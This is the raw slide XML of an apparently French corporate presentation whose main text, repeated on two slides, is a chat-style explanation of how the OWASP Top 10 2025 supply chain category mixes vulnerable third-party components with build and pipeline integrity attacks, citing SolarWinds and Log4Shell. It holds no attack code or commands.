      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du numéro de diapositive 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2176E754-3B4B-4DA9-BBC7-071EEBBD4F8C}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>5</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3120678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Good question to dig into. Let me pull up the actual category page so I'm reasoning from what OWASP actually wrote rather than my </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>recollection.Your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> observation is correct, and it's pointing at something real about how this category is constructed. Let me sharpen the framing a bit, because I think the distinction is even more interesting than "runtime vs. not."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The traditional Top 10 mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Almost every other category describes a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>flaw in the application you build</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — a property of your own code or configuration that an external attacker exploits, typically against the deployed app at runtime. Broken Access Control, Injection, Auth Failures, Cryptographic Failures: the defender wrote the bug, the attacker hits the running system. The locus of both the flaw and the exploitation is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> artifact in production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why supply chain breaks the mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Most of A03 is instead about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>trust and integrity in the process of building and delivering software</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. The thing that gets compromised is something you didn't write, somewhere upstream of your runtime — a vendor's build (SolarWinds), a package registry and the developer/CI environment that pulls from it (Shai-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hulud</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and the post-install execution happens at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> install time, i.e. build/dev, not production). The prevention guidance confirms this: it's almost entirely SBOMs, provenance, signing, separation of duties, hardening CI/CD and developer workstations, IAM — a completely different control set from "validate input" or "enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in your handlers."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>One refinement.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> I'd be careful with "the target is not the production runtime." In SolarWinds the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>ultimate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> target absolutely was production — ~18,000 orgs ran the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trojaned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Orion in their environments. The cleaner statement is that the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>injection/compromise point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is upstream of your code, even when the blast radius eventually reaches production. The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The deeper reason it feels heterogeneous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — and this is the part your "except Log4Shell" carve-out gets exactly right. The category is actually organized along </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>two different axes at once</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin of the code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the SCA / "known-vulnerable component" subset (Scenario #4 — Struts CVE-2017-5638, Log4Shell). These are classified as supply chain because the vulnerable code came from a third party, but they are exploited like any flaw in your own code: runtime RCE against the deployed app, indistinguishable in attack model from a bug you wrote yourself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>integrity of the process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the true supply chain attacks (Scenarios #1–3). These are classified as supply chain because of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>where the compromise happens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (the build/distribution/dev path), regardless of code origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>That's two organizing principles coexisting in one category, which is precisely why it reads as internally inconsistent. The SCA subset is there largely for historical lineage — it descended from "A9:2013 Using Components with Known Vulnerabilities," which became A06:2021 Vulnerable and Outdated Components. The 2025 edition explicitly broadens the scope "to include all supply chain failures, not just ones involving known vulnerabilities," and in doing so it absorbed the old SCA concern into a much larger integrity-focused category without the two halves fully fusing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Two caveats so the distinction doesn't get overstated: A03 isn't the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> category that steps outside the pure-runtime model — A08:2025 Software or Data Integrity Failures is closely related (the page cross-references it) and is also about CI/CD and update-mechanism integrity, and A02 Security Misconfiguration spans build and runtime too. So it's the most pronounced example of the build/dev-targeting threat model, not a unique one. The other caveat is that even the "process integrity" scenarios eventually want to run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>somewhere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — the point is just that your production runtime is the victim, not the place the vulnerability was introduced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>So: yes, correct instinct, and the right way to express it is that A03 mixes a runtime-exploited </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-based concern (SCA, the exception you flagged) with a fundamentally different </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>process-integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> concern that targets the toolchain and developer environment — which is genuinely unlike the rest of the list.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du numéro de diapositive 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2176E754-3B4B-4DA9-BBC7-071EEBBD4F8C}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>6</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4071989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Good question to dig into. Let me pull up the actual category page so I'm reasoning from what OWASP actually wrote rather than my </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>recollection.Your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> observation is correct, and it's pointing at something real about how this category is constructed. Let me sharpen the framing a bit, because I think the distinction is even more interesting than "runtime vs. not."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The traditional Top 10 mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Almost every other category describes a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>flaw in the application you build</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — a property of your own code or configuration that an external attacker exploits, typically against the deployed app at runtime. Broken Access Control, Injection, Auth Failures, Cryptographic Failures: the defender wrote the bug, the attacker hits the running system. The locus of both the flaw and the exploitation is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> artifact in production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why supply chain breaks the mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Most of A03 is instead about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>trust and integrity in the process of building and delivering software</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. The thing that gets compromised is something you didn't write, somewhere upstream of your runtime — a vendor's build (SolarWinds), a package registry and the developer/CI environment that pulls from it (Shai-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hulud</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and the post-install execution happens at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> install time, i.e. build/dev, not production). The prevention guidance confirms this: it's almost entirely SBOMs, provenance, signing, separation of duties, hardening CI/CD and developer workstations, IAM — a completely different control set from "validate input" or "enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in your handlers."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>One refinement.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> I'd be careful with "the target is not the production runtime." In SolarWinds the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>ultimate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> target absolutely was production — ~18,000 orgs ran the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trojaned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Orion in their environments. The cleaner statement is that the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>injection/compromise point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is upstream of your code, even when the blast radius eventually reaches production. The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The deeper reason it feels heterogeneous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — and this is the part your "except Log4Shell" carve-out gets exactly right. The category is actually organized along </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>two different axes at once</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin of the code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the SCA / "known-vulnerable component" subset (Scenario #4 — Struts CVE-2017-5638, Log4Shell). These are classified as supply chain because the vulnerable code came from a third party, but they are exploited like any flaw in your own code: runtime RCE against the deployed app, indistinguishable in attack model from a bug you wrote yourself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>integrity of the process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the true supply chain attacks (Scenarios #1–3). These are classified as supply chain because of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>where the compromise happens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (the build/distribution/dev path), regardless of code origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>That's two organizing principles coexisting in one category, which is precisely why it reads as internally inconsistent. The SCA subset is there largely for historical lineage — it descended from "A9:2013 Using Components with Known Vulnerabilities," which became A06:2021 Vulnerable and Outdated Components. The 2025 edition explicitly broadens the scope "to include all supply chain failures, not just ones involving known vulnerabilities," and in doing so it absorbed the old SCA concern into a much larger integrity-focused category without the two halves fully fusing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Two caveats so the distinction doesn't get overstated: A03 isn't the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> category that steps outside the pure-runtime model — A08:2025 Software or Data Integrity Failures is closely related (the page cross-references it) and is also about CI/CD and update-mechanism integrity, and A02 Security Misconfiguration spans build and runtime too. So it's the most pronounced example of the build/dev-targeting threat model, not a unique one. The other caveat is that even the "process integrity" scenarios eventually want to run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>somewhere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — the point is just that your production runtime is the victim, not the place the vulnerability was introduced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>So: yes, correct instinct, and the right way to express it is that A03 mixes a runtime-exploited </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-based concern (SCA, the exception you flagged) with a fundamentally different </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>process-integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> concern that targets the toolchain and developer environment — which is genuinely unlike the rest of the list.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du numéro de diapositive 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2176E754-3B4B-4DA9-BBC7-071EEBBD4F8C}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1237652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PPE: an attacker who can influence the files/commands that a pipeline executes gets their code run inside the CI environment —</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  inheriting its permissions and secrets</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du numéro de diapositive 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2176E754-3B4B-4DA9-BBC7-071EEBBD4F8C}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>9</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32092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2" name="Espace réservé pour une image  21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABB4CB6D-DE5F-64EA-4948-A268C3B13460}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1313126"/>
            <a:ext cx="12191998" cy="4235056"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR"/>
              <a:t>Image</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Espace réservé du texte 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CDEB226-709D-3E98-A31D-9852E4AD4964}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="15" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860432" y="5582553"/>
            <a:ext cx="1454139" cy="184938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="72000"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="700">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="Inter SemiBold" panose="02000503000000020004" pitchFamily="2" charset="0"/>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fr-FR"/>
              <a:t>PRÉSTATION 2025</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3323862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22" name="Espace réservé pour une image  21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABB4CB6D-DE5F-64EA-4948-A268C3B13460}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1313126"/>
            <a:ext cx="12191998" cy="4235056"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR"/>
              <a:t>Image</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Espace réservé du texte 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CDEB226-709D-3E98-A31D-9852E4AD4964}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="15" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860432" y="5582553"/>
            <a:ext cx="1454139" cy="184938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="72000"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="700">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="Inter SemiBold" panose="02000503000000020004" pitchFamily="2" charset="0"/>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fr-FR"/>
              <a:t>MERCI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Espace réservé du texte 28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A7E3330-31A6-3718-C615-8BF10A9A25C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2838681" y="6082829"/>
            <a:ext cx="6514640" cy="619901"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1200" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="457200" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buFontTx/>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solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>www.catamania.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="366388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12" name="Espace réservé pour une image  11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B55C33D2-17AC-B031-EB67-429F246554C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="762971"/>
            <a:ext cx="6096000" cy="5556867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Espace réservé du texte 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F5A3890-F6ED-5089-EEE8-90EEEF2ABDEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
